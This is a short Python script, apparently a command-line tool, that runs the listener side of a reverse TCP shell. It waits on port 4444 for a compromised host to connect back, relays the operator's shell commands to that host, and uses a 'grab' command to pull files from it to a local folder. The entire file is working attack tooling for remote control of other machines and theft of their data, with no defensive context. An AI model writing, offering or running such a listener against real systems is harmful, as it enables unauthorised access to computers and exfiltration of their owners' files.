import socket
import os
import click
import ntpath


@click.command(help='Create a listener for a reverse tcp shell')
@click.option('--host', default='0.0.0.0', help='the IP to bind the server to')
@click.option('--port', default=4444, help='the port to list on')
@click.option('--struct', is_flag=True)
@click.option('--dest', default='./')
def connect(host, port, struct, dest):
    if not os.path.exists(dest):
        print("The specified destination does not exist.")
        exit(1)

    s = socket.socket()
    s.bind((host, port))
    s.listen(1)
    print('[*] TCP Reverse Shell listening on',host, port)
    conn, addr = s.accept()
    print('[+] we got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command, dest, struct)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

    conn.close()


def transfer(conn, command, dest, struct):
    print(dest, struct)
    conn.send(command.encode())
    grab, path = command.split(" ")
    path, file = ntpath.split(path)
    print(path, file)
    if not file:
        file = ntpath.basename(path)

    if not path:
        if not dest.endswith("/"):
            dest = dest + "/"
        f = open(dest+file, 'wb')
    else:
        os.makedirs(dest+path, 0o755, exist_ok=True)
        if not path.endswith("/"):
            path = path + "/"
        if dest.endswith("/"):
            dest = dest[:-1]
        f = open(dest+path+file, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if 'file not found'.encode() in bits:
            print('[-] Unable to find the file')
            break
        f.write(bits)


if __name__ == '__main__':
    connect()

